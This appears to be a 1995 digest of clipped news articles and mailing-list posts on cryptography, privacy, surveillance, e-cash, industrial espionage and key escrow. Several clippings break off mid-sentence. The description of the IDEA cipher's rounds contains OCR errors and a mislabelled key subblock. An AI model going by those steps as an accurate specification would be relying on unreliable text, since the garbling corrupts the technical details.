the card and daily as you use it you wave it over an
antenna and it deducts the fare for that day."
Keane said electronic ticketing primarily benefits the
frequent traveler. The user would simply wave their card

According to Jerome Svigals, publisher of Smart Cards &
Comments and a consultant to the electronic banking
industry, contactless technology is very valuable to the
user because of its speed, convenience, ease of use, low
cost and perhaps most importantly its security. "Even
more significant is this smart cards' ability to manage
multiple applications with contactless technology that
ensures the highest long-term data integrity, especially
important for electronic purse requirements," said the
industry consultant.

For zoetrope, and others curious about the Insecurity
section of the Internet Handbook, we pass along this
Yellow Pages advert-insert comp sec teaser from
SAIC -- with only dribbles of cryptography. The puffery
appears to be artfully fattened and out-of-date. Like most
security porkers, SAIC sells its nitrated sec services
dearly (security by deep pockets of the fearful engorgers)
while feigning Net public-spirit to mask IP search and
steal. In a telling slight, SAIC does not cite outturned-
pockets, beef jerky Cypherpunks.

c2.org expired and was cancelled, thus the remailer is down.
Previously, it had been a full-fledged cypherpunk-type remailer,
with Type II (Mixmaster) capabilities, to boot.
Such are the uncertainties of using remailers.  What would have been
nice, of course, would have been for Sameer (sameer at c2.org), or
whoever runs Community Conexxion, to post a bulletin here giving
everyone a few days' notice before pulling the plug on this

wondering why their messages/posts are not showing up.

Tokyo (AP) -- Japan said that its relations with Washington could be seriously damaged if a report that the CIA spied on Japanese representatives at auto talks proves true. The New York Times reported Sunday that the CIA eavesdropped on conversations between Japanese negotiators and automakers during the talks in Geneva this year, reporting the results daily to U.S. Trade Representative Mickey Kantor. According to the report, Kantor was provided with summaries of conversations between Japanese bureaucrats and executives from Toyota Motor Corp. and Nissan Motor Co. Toyota called the alleged eavesdropping ``unthinkable,'' but refused to comment further.

       France Identifies USA as "Main Adversary"

            FRANCE: Ringing the Alarm Bells
"For the first time in France, a boss of the country's
Direction de la Surveillance du Territoire (DST) spoke in
public at a seminar on the theme "Companies and Business
Intelligence" that was laid on by the Institute des
Hautes Etudes de Defense Nationale (IHEDN) at the French
Senate on July 4.  As he himself declared on the
occasion, Philippe Parant agreed to speak out 'despite
the special nature' of his functions in order to alert
French business circles of the dangers of 'economic
warfare'.  To be sure, the main aim of the gathering
which drew a full house was to ring the alarm bell. According to Gen. Bernard Norlain, head of IHEDN,
economic warfare now forms part and parcel of 'an overall
approach to defence'.  IHEDN will dispense a course on
business intelligence to 30 high-level trainees in the
"Most of those who spoke at the seminar identified the
U.S. as both the main adversary in the war and the best
model of how it is fought.  This was especially the case
of Francois David, head of French export credit guarantee
agency COFACE who said the only response to the U.S.
'could be European' in scale.
Elsewhere, Remy Pautrat, deputy dead of France's
Secretariat General de la Defense Nationale (SGDN) paid
tribute to the French  president for signing a decree on
April 1 that gave birth to a Comite pour la Competitivite
et la Security Economique under the authority of the
French Prime Minister.  Pautrat said the Committee formed
"the nerve center of a more ambitious system" that was
currently being set up, partly in secret."
             FRANCE-the DST's New Defences
"During the seminar cited above DST chief Philippe Parant
reckoned that economic, scientific, and industrial
espionage had increased considerably over the past few
years.  It now accounted for 60% of cases that come to
the authorities' attention compared to 40% for political,
diplomatic, and military spying. Methods had also changed
because state-sponsored espionage had increasingly taken
a back seat to a type practices by private intelligence
companies, international audit firms, head-hunter
concerns, as well as insurance and reinsurance companies. Parant said that effective defence against the onslaught
could not come from government services alone.  "If that
were the case the game would be lost in advance," he declared.  He suggested that as many staff as possible in
big companies be made aware of business intelligence
concerns.  In addition he called for "genuine
information-management training in engineering
universities."  For maximum impact, he said, such
training should not be dispensed by security services but rather by specialists in each specific discipline."
                L'Expansion Cover Story
With the above background in mind, we can now better
understand the cover story in L'Expansion of 10-18 July
1995.  This prestigious journal, widely regarded as the
French equivalent of Forbes, Fortune, and Business Week,
appears to have been manipulated by French civilian
intelligence and self-promoting private sector business
intelligence activities.
The cover story of L'Expansion is nothing less than a
call to arms for the French business community, and the
opening declaration of war on the United States of
America.  Unfortunately, this article was very likely
drafted in active cooperation with French civilian
intelligence experts, and should be considered a "covert
media placement".
I have taken a personal interest in the article because
it links me with President William Clinton, Director of
Central Intelligence John Deutch, and the founder of
Kroll Associates, Jules Kroll.  I am honored.  Sadly, the
article, while identifying me as the apostle of open
source intelligence, is gravely in error when it
identifies me as the linch-pin for a new covert strategy
to undermine the French economy, and also alleges that I have been actively discouraged from implanting myself
in France by the French authorities.
There are three "realities" that need to be explored
here.  First, there is a budget battle going on in
France, and the French civilian intelligence services are
doing everything they can to "hype" the threat and obtain
increased manning and funding.  This should not surprise
us, but the apparent subversion of the previously
prestigious journal L'Expansion to the desires of French
civilian intelligence, is cause for concern.
Second, my sources in France tell me that the larger
French companies, especially those in the defense sector,
do not take this threat seriously because they are much
superior to U.S. companies at the business of industrial
espionage.  A very well-informed source has suggested to
me that this cover story is the result of an alliance
between French civilian intelligence (attempting to
increase its budget) and General Pichot-Duclos of
INTELCO, who is attempting to increase his business
practice among the small businesses in France foolish
enough to believe in this exaggerated threat.
Finally, for the record, I wish to note that I was
invited to France by Mr. Francois Leotard, the Minister
of Defense, with the explicit approval of Prime Minister
Balladur, in order to join Admiral Pierre Lacoste,
General Jean Heinrich, and General Jeannou Lacaze in
speaking to a very select group of 300 French leaders
from government, industry, and the  academy on 23 October
1993.  We spoke about the need to reinvent intelligence
and significantly increase reliance on open sources.  The
presentations that these distinguished flag officers and
I made have been published in a book  called Defence and
Intelligence, available (in French) from Editions
L'Harmattan, 5-7, rue de l'Ecole-Polytechnique, 7500
5 Paris.

@_subject: SciAm Bye-Byes Privacy 
Scientific American, November, 1995
Rights of Privacy
Technology has its eyes on you
Privacy, as George Orwell pointed out, rests on some
level on a bargain between people and their machines.
Long before 1984, communications technology had the
potential to become surveillance technology. Now it is.
Not, as Orwell might have predicted, because Big Brother
wants to keep his subjects in thrall but simply because
most people want it to be. By giving up some protective
anonymity, people get safety and service. A majority seem
to think the bargain a very good one -- which is why
everybody should look very carefully at the fine print.
Somewhat ironically for the nation that gave birth to
Orwell, Britain is leading the way in creating the kind
of society that he taught the world to fear. More than
300 British city streets are wired for 24-hour
surveillance by closed-circuit television cameras. From
control rooms, police and private security officers scan
everything that moves, or doesn't, and dispatch police
officers to investigate anything suspicious.
More cities are getting wired all the time, often by
popular demand. Whatever qualms Britons have about
privacy, they are more concerned about crime. The cameras
do seem to reduce crime -- at least in the areas
underneath the cameras. Academics point out that
surveillance seems to have no impact whatsoever on the
overall level of crime, which is rising, but people just
don't seem to care about where the muggers go when they
leave their neighborhood -- particularly when their
neighborhood wasn't too good to begin with.
Safety is not the only reason to embrace surveillance. At
the Olivetti Research Laboratory in Cambridge, for
instance, Andy Hopper and his staff have for years worn
tiny badges that inform their computers where they are
each minute. The point is convenience. Computers
automatically bring to the screen the work of the person
sitting in front of them. Calls are forwarded to the
telephone nearest wherever they happen to be -- unless
the computers detect three or more badge wearers gathered
in the same office, in which case they are assumed to be
in a meeting, and calls are forwarded to their voice
To make life more convenient still, Hopper is trying even
cleverer technologies. Some chairs now contain compasses
that monitor whether they are pointed at a screen, and,
if not, the screen is dimmed to save power. Such devices,
Hopper reckons, are crucial to making computers
effortlessly easy to use. As he puts it, "You can't have
personalization without identification."
But the search for personalization in a high-tech world
may create an uncomfortable situation in the global
village. Villages are safe places but not very private
ones. Mrs. Grundy, peering from behind her lace curtains,
did stop housebreakers. but she also tried to halt many
other things of which she disapproved. There are signs
that Grundyism is returning to Britain. Many of the
crimes recorded by surveillance cameras are worryingly
petty. Arrests for urinating in public have soared. For
better and for worse, cameras that can see in the dark
now line romantic walks to the beaches in seaside towns.
In Britain, as elsewhere, technology and politicians are
about to deepen the privacy dilemma. Cameras are being
linked to smarter computers that can identify people.
Some drivers receive tickets without human intervention.
Video cameras check their speed and read their license
plates. Along with a ticket, the owner is sent a
photograph of the car and driver at the time the speeding
was clocked. A number of companies are touting technology
that can recognize faces by matching video images to
digitized photographs (from, say, drivers' licenses).
The British government, like many others, is also
discussing plans for a national identity card that would,
by giving everyone a number, make it easier to keep track
of personal data. The selling point is convenience. Much
of the work of filling out forms in bureaucratic Britain
is simply to give one branch of government information
that another part already has -- or to correct
information that bureaucrats have got wrong.
Convenient though it may be in theory, the combination of
national identity schemes and surveillance cameras
promises to give governments many of the powers of an
all-seeing God. And there are many reasons to worry that
mere humans would not be as merciful or as competent. Two
aspects of surveillance will prove crucial in determining
the practical terms of the new privacy bargain now being
struck: choice and reciprocity.
Unlike the subject of video surveillance, the wearer of
one of Olivetti's badges can remove the device and
disappear from the system. His electronic identity is
entirely a voluntary one: if he wishes to forward all the
telephone calls the old-fashioned way, by hand, there is
nothing to stop him. Surveillance becomes less intrusive
if it is optional. But choice cannot be a cure for all
the potential ills of surveillance. As electronic
personalization makes electronic identification more
important, that choice becomes harder to manage.
One problem is forgery. If electronic identities can be
taken on and off like sweaters, the risk that fraudsters
will be able to put on somebody else's identity rises.
Besides, as such identification becomes more important,
the sheer effort required to live anonymously will render
choice moot. Anonymity will simply become too much work.
Real village traditions offer hope for the lazy and the
identifiable. In village life, surveillance was
reciprocal: if Mrs. Grundy knew a lot about you, you also
knew a lot about her -- and you knew what she knew about
you. Technology should further extend this reciprocity.
The badges in the Olivetti lab provide a way of locating
any badge wearer. But they also allow badge wearers to
track anybody who is trying to locate them. There can
indeed be no personalization without identification, but
there is increasingly little excuse for identification
without notification. The same computers and networks
that send faces, names and numbers whizzing around the
world could also be required to send notification back to
each of those identified, each time they have been
spotted. Even as the world becomes more personalized and
less private, there is no reason for the electronic
global vilage to become less personable than a thatched
one, or less fair. Photo caption: Video cameras will scan the crowd at the
1996 Olympic Games in Atlanta. The security system can
transmit images for identification.

Doing Business on the Net
By Anne Eisenberg Like the leaves of autumn, those resolutely noncommercial
days on the Internet when ads were anathema are dwindling
fast. Nowadays the Internet's World Wide Web has so much
commercial promise that it has spun off an association
called the HTML Writers' Guild (http:
literate in Hypertext Mark-up Language (HTML is the
language of the Web) to create dramatic "home pages,"
sites on the Web where a growing number of businesses
advertise their wares. "We're there for the same reason
we have banks in malls," one Citibank executive
explained. "It's where people congregate."
Web ads are quickly evolving into arresting combinations
of sound, text and vivid, point-and-click picture links
called image maps. Computer science students who were
once stern critics of business on the Net now eye the ads
appreciatively, so long as they are not "in your face" --
inserted where people have no choice but to look at them.
Besides, commercials may one day pay for Net services,
much as they now underwrite programs on radio and
television. And the ads are convenient: click on the
icon, read about the product and order, all in one step.
Many companies arc poised to put not only advertisements
but entire catalogues on the Web as routinely as they now
list their services in me Yellow Pages. After all, if
e-mail could hatch a generation of letter writers by
eliminating the bother of envelopes and stamps, surely
commerce should blossom when paper catalogues fall, and
we all start buying straight from the screen.
For business to thrive, though, people will need a secure
way to pay and be paid on the leaky Net, where messages
containing credit-card numbers can be intercepted as they
travel from machine to machine. And all those prospective
shoppers, entrepreneurs and micromerchants will want not
only secure payment mechanisms but also a choice -- cash,
check or charge -- before they hit the convenient,
brightly colored order links. Inspired by a vision of
untold millions buying and selling on the Net, companies
and banks (among them Chase Manhattan, Citibank,
CyberCash, DigiCash, Mondex and Microsoft) have joined
what is being called the Gold Rush of 1995, as they race
to become the Great Central Biller in the Sky.
No victors have yet emerged, but early leaders are
probably going to provide security in the form of
public-key, (PK) cryptography, ingenious algorithms that
use pairs of unique numerical "keys" for encoding and
decoding messages. If you use PK software for an online
shopping trip, you will have your own pair of keys, one
public and one as private as the identification number
you use to get cash from an automated teller machine.
When you order, your program will automatically encrypt
the information with your private key. When the company
uses your public key to decode the order, it will know
without question that the message was generated by you --
the match is the digital signature that authenticates the
transaction. Companies in turn will encrypt messages to
you with your public key; the messages will be secure,
for only you can decrypt and read them, using your
private key. Netscape and other new Web browsers --
software that lets you travel to linked Internet
resources without typing complicated addresses -- are
known as encrypting browsers; they are ready to help you
shop securely on the Net. Some will even come with
built-in PK signatures.
Whether the cryptographically cloaked digits of e-money
will bestow privacy in addition to security is another,
far more contentious matter. When people start using
e-wallets instead of cash to rent a video or lend a
friend $20, fertile new areas for infringing on privacy
will bloom. Electronic dossiers can be compiled by
automated systems that track spending habits. Many people
will not want the details of their daily lives collected
and stored in, say, consumer preference data banks,
joining the folders that already document their health
and credit ratings.
Only a few of the emerging electronic payment systems
address privacy issues. The untraceable digital cash
closest to hand is probably Chaumian cash, named in honor
of David Chaum, founder of DigiCash and of the
cryptographic protocols that underlie his anonymous
digital-money technology. Chaum's patented e-cash is an
adaptation of PK cryptography that includes one-way
privacy for the payer. The bank can verify that the money
is genuine but is blinded from identifying the source.
This means you will be able to prove you have made a
payment when you need to, but the bank cannot flick a
switch to retrieve the records of your travel and
entertainment preferences and add them to its data-mining
The terminology of electronic commerce reflects the clash
of cultures that has come about as the youthful language
of the Net meets the austere discourse of banking. The
jaunty "e-" prefix has attached itself firmly to Nettish
talk of the e-wallets and e-purses that we will soon be
using to make our e-payments. But bankers resist this
linguistic cheeriness. They substitute "digital" for
"electronic" whenever possible and never shorten it to
"d-" when they speak of the digital time stamps and
digital signatures they will soon offer us to
authenticate our digital payments. And cryptography
(known affectionately as crypto on the Net) is still a
four-syllable word at the bank, where it is against
nature for managers to be linguistically fond of any
action that commits them to untraceable communications
and exchanges.
We will know the new, hybrid field of electronic commerce
is truly on its way when banking ads on the Web offer
"strong crypto" and even, as a backup, steganography (the
science of hiding the existence of messages in, say,
microdots or sound files) for telephone chats with loan
officers. On the Net, of course, this service is already
known as stego.

Right.  Both payer and payee should introduce their own blinding factors.
Now all we need is to do is get some specs on how DigiCash's software works
so that we can code this.  I expect that this method will become quite
popular.  To withdraw DigiCash, one must come up with $250 to start, sign a

A '90s Espionage Tale Stars Software Rivals, E-Mail Spy
By Glenn Simpson
Technothriller novelist Tom Clancy might have a hard time
dreaming this one up.
In a computer-age case of spy vs. spy, a small software firm
is claiming to have uncovered an industrial espionage attempt
by a much larger competitor by using a controversial e-mail
Court documents and interviews tell a tale of intrigue,
deception and twist upon twist. Not to mention the alleged
involvement of a mysterious "classified government agency."
The protagonist is Performix Inc., a closely held
eight-year-old firm in McLean, Va., that has carved out a
significant niche for itself producing Empower, a software
program used for "load testing," which measures the ability of
a software program to serve many users simultaneously. Every
major computer manufacturer now uses Empower.
Enter Mercury Interactive Corp., a $300 million publicly
traded California firm that also is in the business of selling
software-testing products and produces competing software
called Load Runner. In June 1995, a senior Mercury Interactive
official, Graham Burnette, allegedly wrote to Performix
inquiring about a possible corporate alliance to develop
load-testing software. Performix spurned the offer.
Around the same time, a Virginia businessman named Joel
Dietrich, president of an obscure company called Styx Systems,
approached Performix asking to try out a version of Empower
known as Empower/CS on behalf of an anonymous client.
According to Performix, Mr. Dietrich said he couldn't identify
the client because it was a federal government intelligence
agency. On June 16 Performix granted Mr. Dietrich and Styx a
short-term license to use Empower/CS.
At 1:55 a.m. on Saturday, July 29, Performix received a most
curious e-mail message over the Internet. The message
indicated that someone who wasn't authorized to do so was
trying to install Empower/CS on a large computer and examine
its "source codes" -- the software's secret programming
language. A feature Performix had embedded in Empower/CS
automatically causes an e-mail alert to be sent to Performix
whenever there are indications the software is being used
The e-mail indicated the address from which it had been sent:
"merc-int.com." This is the registered Internet address of
Mercury Interactive.
The e-mail also gave the name of the network on which someone
was installing the copy of Empower/CS: "testrun.mercury."
The license number of the software apparently now in Mercury
Interactive's hands, the e-mail further indicated, was the
license number of the copy that had been leased to Styx.
While Mercury Interactive and Mr. Dietrich have disavowed any
knowledge of a possible software transfer, Mercury
Interactive's Mr. Burnette acknowledged in an interview that
Mr. Dietrich's daughter and son-in-law work for Mercury
In mid-August, in U.S. District Court in Alexandria, Va.,
Performix sued Mercury Interactive, Styx and Dietrich,
alleging copyright infringement, fraud, conversion, unfair
competition, breach of contract and unjust enrichment.
Performix alleges Mercury Interactive "acquired Empower/CS so
that it could unlawfully, willfully and maliciously copy, use
and/or reverse engineer Empower/CS for the purpose of
improving the performance and features of existing Mercury
Interactive products in an attempt to gain significant
economic advantage."
Mercury Interactive hasn't yet formally responded to the
allegations, but Mr. Burnette denied any wrongdoing by the
company. "Mercury Interactive has a very strong policy against
industrial espionage," he said. "We don't do it."
Mr. Dietrich's response filed with the court has raised some
eyebrows. While claiming no knowledge of any transfer to
Mercury, he hasn't backed away from his claim to be working
for the federal government. Indeed, Mr. Dietrich is asserting
that he is immune from the suit because he was acting as an
agent of the U.S. government. He claims in court papers that
he obtained the software on behalf of "a classified government
None of the parties to the case who were willing to be
interviewed said they knew the identity of the agency, and Mr.
Dietrich didn't respond to interview requests. However, Mr.
Burnette of Mercury Interactive said: "I know that Mr.
Dietrich works as a contractor for a government agency. I know
it's a secret government agency, but I don't know what it is."
Officials of both Mercury Interactive and Performix said the
two firms have reached a tentative settlement, although they
disagree on what it contains. "Everything Performix needed
from a business perspective they received, including the
ability to review Mercury Interactive product releases," said
Performix attorney Nelson Blitz. In addition, "money will be
paid to Performix under this agreement in principle." But Mr.
Burnette asserted that no money would change hands.
The penultimate turn: Mr. Burnette claims that Performix is
eager to settle the case because it has a problem of its own.
He contends that it is illegal to secretly embed in commercial
software code a program that causes the customer's computer to
send out e-mail. Mr. Blitz of Performix denied there was
anything legally questionable about the practice and said
Mercury Interactive never raised that issue in settlement
negotiations. He also said the feature isn't intended to be a
spycatcher. Rather, he said, it is meant solely to help
clients who are improperly installing the product by alerting
Performix that they need help. Empower's documentation informs
customers of the feature, he added.
James Haggard, president of Vasco Data Security Inc., said the
purpose of such programs is ambiguous, and it would be hard to
rebut Performix's claim that the feature is merely meant to
serve the customer. He noted that Microsoft Corp.'s new
Windows 95 software contains a program that can send Microsoft
a report on the software products being used by those who sign
up for its on-line service albeit only with the users'
permission. While critics label it a means of economic
snooping, the company says the program simply helps it assist
"The concept of a program calling home of its own accord" is
controversial in the computer industry, said computer security
expert Samuel Bellovin of Bell Labs. "People tend to get very
upset when it happens," he said, because it can look as if the
software maker is spying on them.
The final twist: Performix last week agreed to be acquired by
Pure Software Inc., a publicly held firm as large as Mercury
Interactive-which now will be up against someone its own size.

Freedom of Net Speech (Editorial)
Is speech on the Internet like speech in a public square,

where leafleters and demonstrators need permission? And
what about universities, where students using university
accounts for e-mail and other messages may find
themselves subjected to disciplinary rules? The latter

has come under challenge for disciplining a student who

The difficulty of framing such questions or even of

Time is right for a good, secure 'Idea'
Computers are the medium in which almost all of today's business deals and international transaction transpire. That calls for the development of secure systems, which protect data from being accessed by unautho-rized users. Digital Encryption Standard (DES) is a cipher system that uses a 64-bit-long secret key. With present comput-er technology, it is not difficult to break DES by trying all possible keys. That made cryptographers look for different encryption algorithms that take a long time for today's computers to break the code. The International Data Encryption Algorithm (Idea) is a private key-block ciphering scheme, which is computationally highly secure since it uses a 128-bit-long secret key. The brute force method of breaking the code, (trying all possible combinations as keys) would require 10^24 years for a chip that can test a billion keys per second. The design philosophy of Idea is to niix the operations from different algebraic groups to add confusion and di!
 ffusion to the input data. The operations are addition modulo, multiplication modulo, and exclusive OR (XOR).
We have implemented Idea in electronic-code-book (ECB) mode on the Motorola DSP 561xx family of processors. In ECB mode, a 64 bit input block is encrypted to generate a 64-bit output block that is transmitted to the receiver through insecure but error free channels. In Idea, all the algebraic operations work with 16-bit blocks of data. That makes the algorithm efficient on a 56 to DSP, which has a very good instructioln set to perform the addi-tion modulo 2^16, multiplication modulo 2^16 + 1 and 16-bit XOR operations.
The Idea is a block-cipher scheme in which the incoming data is divided into blocks of 64 bits and fed as input to the encryption algorithm (see figure). The 64 bit data X= (X1 X2 X3 . . . X64) is initially divided into 4 subblocks X1, X2, X3 and X4each of 16 bits. These four sub-blocks become input for the first round of operation. In each round, each subblock is added and multiplied under modulo fields with key subblocks, thus adding more confusion and diision.
The sequence of operations for the first round is given below; it's the same for all rounds of operations except for different key subblocks.
[1] Multiply X1 and Kl, (first key subblock Zl^l) under modulo 2^16 + 1
[2] Add X2 and K2 (Z2^1) under modulo 2^16
[3] Add X3 and K3 under modulo 2^16  [4] Multiply X4 and K4 under modulo 2^16 + 1
[5] XOR the results of step 1 and step 3
[6] XOR the results of step 2 and step 4
[7] Multiply the results of step 5 and K5 under modulo 2^l6 + 1
[8] Add the results of step 6 and step 7
[9] Multiply the re sults of step 8 and K6 under modulo 2^16 + 1 .
[10] Add the results of step 7 and step 9 under modulo 2^16
[11] XOR the results of step 1 and step 9
[12] XOR the results of step 3 and step 9
[13] XOR the results of step 2 and step 10
[14] XOR the results of step 4 and step 10
The results of each round from steps 11, 12, 13, and 14 form the  input blocks for the second round of opera-
tion after swapping the two inner blocks (see figure). After eight rounds are over, the following transformation has to be done before taking output cipher text. It should be noted that swapping is not done for the
last round.
[1] Multiply X1 and the 49th key subblock K49 (Z1^9)
[2] Add X2 and the 50th key subblock to k50 (Z2^9)
[3] Add X3 and the 51st key subblock k51 (Z3^9)
[4] Multiply X4 and the 52nd key subblock K51(Z3^9)
The decryption algorithm is also exactly the same except for the change in the subblock keys. From each of the key subblocks in the encryption, either additive inverse or multipli
cative inverse is used. For example, the subblock key used to multiply this data subblock is re placed with its multiplicative inverse. Also the order in which that multiplicative and additive inverse occurs in the decryption algorithm takes care of the shuffling of the intermediate data subblocks.
As stated earlier the encryption key is 128 bits long. The 52 encryption subblock keys are derived from the encryption key, and the corresponding subblock keys are derived from the encryption-key subblocks. The key subblocks for the first round of encryption are derived by dividing the 128-bit-long key into 16-bit blocks. Then, for every next round, the encryption key is circularly shifted by 25 bits and then divided into 16-bit blocks to yield encryption-key subblocks. In the last round, only the first four key subblocks are generated.
The Idea can be implemented in all three modes of operation: ECB, output-feedback mode (OFB) and cipher-feedback mode (CFB). In ECB, the input is split into 64-bit blocks, encrypted and transmitted. In CFB, the output cipher text from one block of encryption is used to form part of in input block. And the output of the algorithm is XORed with the input plain text, and transmitted. Similarly, the feedback is taken after
the XORing operation. In thepresent implementation, only ECB mode is done, which is the fastest among the three.
Since all the operations are on 16-bit blocks, the powerful instruction set of 561xx can beused for efficient implementation. The modulo 2^16 + 1 multiplication operation is used many times, and it is computationally intensive when compared with XOR and modulo 2^16 addition. The fixed-point multiplication construction of 561xx can be utilized to perform 32-bit multiplication.
The modulo 2^16 addition operation can be done just by ignoring the carry of 16-bit addition in 561xx. The XOR operation is also supported in one instruction as in any other DSP processor. Hence all three algebraic operations can be implemented efficiently using the instruction set of 561xx
Again the decryption algorithm is exactly the same as the encryption algorithm, except, that the decryption-key sub block is used instead of encryption. The whole program can be reused for decryption by changing the input variables and output variables.
Circular shift The main computation in encryption-key subblock generation is the circular shift of the l28-bit-long key. The encryption key can be stored as eight words in memory. In the present implementation, instead of shifting the key circularly, the mask patterns are used to pick up suitable key subblocks. That is, the second set of eight key subblocks can be generated by picking up 16 bits from the ninth bit of the second word of the encryption key.                 Hence, for each round, we need to multiply each encryption key word by a suitable mask pattern, and left shift it with a suitable number of bits. The left-shifting operation for any arbitrary number of bits can be performed using the integer multiplication. Storing the mask patterns can be eliminated by using the shifted version
of left-shift constants as right-shift constants. The left-shift constant is multiplied with the current encryption-key word, and the right-shift constant is multiplied with the next keyword, and both are combined to
generate one key subblock. The right-shift constants are gotten by right shifting the left shift constant by 1 bit, which considerably reduces the computation involved. The current implementation of Idea in ECB on Motorola's DSP 56166 running at 60 Mhz supports up to 625 kbits/second in full-duplex mode. That is 3.6
times faster than using the DES algorithm.

Netcom to Use Smart Switches For the Internet
By Audrey Choi
Internet provider Netcom On-Line Communication Services Inc.
said it will use high-speed network switches from Cascade
Communicaffons Corp. in a move to upgrade the speed and
flexibility of its Internet services.
Netcom's decision represents a significant endorsement for
Cascade, a small Westford, Mass.-based company whose revenues
have soared along the rapid growth of the Internet. In
addition to Netcom, Cascade also is supplying switching
devices, which control the flow of information across a
far-flung computer network, to UUNet Technologies Inc. and
Performance Systems International Inc.
To prepare for an expected rise in the number of users,
networking analysts say the Internet needs to move toward a
more efficient architecture based on high-speed intelligent
switches, like Cascade's, which not only allow large volumes
of data to be transmitted quickly, but also offer Internet
service providers the ability to track and manage the data
being transported.
Brad Meinert, senior analyst at research firm Input, says the
tremendous growth of the World Wide Web, a graphics Internet
interface, "is putting increased capacity demands for greater
bandwidth on the Internet infrastructure."
In the past, the Internet depended primarily on simpler
router-based wide-area networks that provided access to users
with dial-up modems and leased lines. Bundles of data moving
over this kind of network is evaluated and processed at each
router until it arrives at its destination -- a tedious
process that can adversely affect time-sensitive applications,
such as video conferencing.
"We've been talking about an information super highway, but
our infrastructure is really just dirt roads," said Daniel E.
Smith, Cascade's president and chief executive. Mr. Meinert
noted that "switching is clearly the next generation, which
allows you to create the virtual network."
Financial details of the Netcom deal weren't disclosed, but
Cascade's Mr. Smith said the deals with the three major
Internet providers initially represents "tens of millions of
dollars" of business. UUNet said it has purchased $6.5 million
worth of Cascade products.
Cascade's switches provide the highest port density and
highest network capacity, analysts say. Its switches range in
cost from $25,000 to $250,000 and enable a far greater number
of users to access the Internet through any one point. While
a typical router may be able to handle 20 to 50 users, a
single Cascade switch can accommodate 1,000 users, says Desh
Deshpande, Cascade's founder and marketing vice president.
Additionally, the management capabilities of the smart
switches enable Internet providers to track how many data
bundles a customer sends, where each bundle is at any point in
time, and what priority on the network they should be given.

Online bank era dawns
By Louise Kehoe
The Security First Network Bank established by Cardinal
Bancshares -- a small Kentucky savings and loan institution is
the first financial institution to conduct true online banking
over the Internet.
SFNB's pioneering effort may influence the growth of Internet
banking. Larger financial institutions are watching for clues
as to how consumers respond and to see whether the cyberbank
can live up to its "Security First" name.
Concerns about Internet security exacerbated by incidents in
which supposedly secure software has proven vulnerable -- have
made banks cautious. SFNB claims to have created a "virtual
vault" for each customer account, using a "trusted" computer
operating system from Hewlett-Packard the second largest US
computer company, as well as encryption and user
authentification software, and firewalls.
"We have overcome the problem that has prevented banks from
transacting over the Internet," said James Mahan, SFNB's
Perhaps cyberbanking's biggest draw is that the SFNB is open
24 hours a day, seven days a week. Customers will be able to
conduct standard personal banking tasks such as paying bills,
transferring funds from one account to another and checking
the balance of an account.
Nor are there queues at the counters in the "virtual lobby" of
the SFNB which are staffed by computer renditions of
R2D2-style robots (
But waiting for images to download from the Internet over a
modem may persuade users that a bus trip to their local bank
is not such a bad idea.
SFNB also faces competition from more than 20 US banks
including Chemical Bank, Wells Fargo and First Interstate that
have formed partnerships with Intuit, the leading personal
finance software company, to enable users of the popular
Quicken program to access information from their accounts and
pay bills electronically.
Services offering stock prices, information about mortgages,
loans and retirement funds as well as insurance are
Some of the most innovative include BankAmerica's new Web site
which opened a week ago with an invitation to users to "build
your own bank". By filling in a form, users can tailor the
information presented to fit their interests.
A student, for example, might be presented with information
about obtaining loans for college fees. Someone close to
retirement age would automatically be routed to information
more relevant to his interests.
One of the largest mortgage lenders in the US, Bank of
America, has also chosen to put an emphasis on property
purchases at its Web site.
Hyperlinks to real estate firms throughout the US enable users
to search through lists of homes for sale and then to link
back to the bank in order to apply for financing
Among the biggest attractions of the Internet for consumers,
including consumers of financial services, is the ability to
"shop around" so as to compare costs and advantages.
The insurance industry is taking this to heart in a new
service that goes live today. Insweb will enable consumers to
seek quotes from a range of companies and brokers on life,
home, car and medical insuranee.
The service, established by a group of 25 insuranee companies
and related organisations is the first "marketplace" on the
Internet for insurance information and commerce.

It's Time You Became A Manager of Change, The Consultants Say
Rapid innovation and product introduction require a nimbleness
lacking in many corporate bureaucracies.
"There's an intrinsic need to improve your effectiveness at
managing change -- whatever form it takes," says David Nadler,
chairman of the New York-based Delta Consulting Group.
Change-management boosters are also telling managers to learn
about "knowledge management" as a means of achieving their new
Knowledge management attempts to make fuller use of internal
information networks. The consulting units of Arthur Andersen,
Ernst & Young and Price Waterhouse are peddling systems to
collect, store and distribute knowledge. Andersen designates
"knowledge managers" who monitor traffic through its Lotus
Notes e-mail software and store valuable information on a CD-
ROM. The disk contains 16,000 pages on everything from
performance measurements to employee motivation.
One problem with the system: "It's so difficult to tie
knowledge-management systems to bottom-line improvement," says
C. Jack Grayson Jr., whose American Productivity and Quality
Center co-sponsored a knowledge-management symposium with
Arthur Andersen. "That just feeds suspicions that it's just
another fad."
It's also difficult to get employees to contribute to the
information pool [fearful their jobs may vanish after overt

Privacy Laws Are Lax On New Technology, Federal Agency Says Washington -- Inconsistent privacy laws let companies sell
sensitive information about consumers who use new
communications technologies, the Clinton administration
In a report, the Commerce Department's National
Telecommunications and Information Administration called on
communications companies to tell customers if they plan to
sell information about what they watch or whom they call, and
to make it easy for customers to squelch the disclosure of
sensitive information.
Federal regulations allow people to ask their phone company to
keep information confidential, but the rule generally doesn't
apply to small phone companies or wireless phones, according
to the report. Laws that prevent video stores from disclosing
what movies customers watch don't apply to pay-per-view
services by satellite-television providers. And while a 1986
law prevents on-line computer services from snooping into
electronic mail, it doesn't prevent the services from selling
information about who e-mailed whom, and what the topic was,
the report noted.
The Commerce Department stopped short of calling for
legislation to close the gaps. But "if industry doesn't do it,
consumers will demand that the government do it," predicted
Larry Irving, assistant commerce secretary for communications
and information.
Industry representatives played down the privacy loopholes.
Ronald Plesser, a Washington attorney who represents online
services and direct marketing firms, said, "I know of no
example of anybody trafficking in e-mail descriptions." A
spokeswoman for Hughes Electronics Corp.'s DirecTV said, "We
do not release names of customers that ordered movies.

Key Escrow Workshop agenda & discussion paper 3
September 1, 1995
Dear Participant:
Thank you for agreeing to participate in the two-day
meeting on software key escrow encryption.  We are
anxious to work with you and other industry
representatives to facilitate development of exportable
key escrow encryption in software products.  I look
forward to the workshop being an important step in that
I have attached a draft agenda for the two days.  I
propose that we spend the majority of our time discussing
a set of export criteria.  In order to move that
discussion along, a draft set of criteria is attached. The criteria state, in general terms, the government's
needs with respect to exportable software, consistent
with its law enforcement and national security
requirements.  Since it is important that the final
criteria be clear, straightforward, consistent, and
implementable, Mike Nelson of the Office of Science and
Technology Policy will spend a few minutes describing
these criteria on the first morning of the meeting. After that, we would like to hear your perspectives on
them and work with you to refine them.  On the second
